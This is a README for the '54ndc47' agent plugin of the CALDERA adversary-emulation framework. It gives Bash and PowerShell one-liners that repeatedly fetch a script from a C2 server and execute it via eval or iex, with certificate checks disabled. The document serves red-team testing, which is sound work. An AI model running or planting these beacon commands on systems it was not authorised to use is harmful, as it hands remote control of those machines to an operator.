# 54ndc47

This plugin contains:
* A custom in-memory agent, with variants for PowerShell and Bash
* API endpoints for the agent to communicate to CALDERA over HTTPS

## Quick start

Start the agent on a Linux or OSX box with either of the bash commands below. Note, the second 
command attaches a group to the agent when it first registers.

```
while true; do eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render)"; sleep 60; done
while true; do eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render?group=client)"; sleep 60; done
```

Similarly, you can start the agent on Windows machine with either of the following:

These commands are more verbose then the bash ones because they dynamically accommodate all versions of 
PowerShell, from 3.0+. 

```
while($true) {$ErrorActionPreference='SilentlyContinue';$url="https://localhost:8888/file/render"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);};sleep 60}
while($true) {$ErrorActionPreference='SilentlyContinue';$url="https://localhost:8888/file/render?group=client"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);};sleep 60}
```

## Operating systems

Currently, 54ndc47 will run on any Linux, OSX or Windows machine.
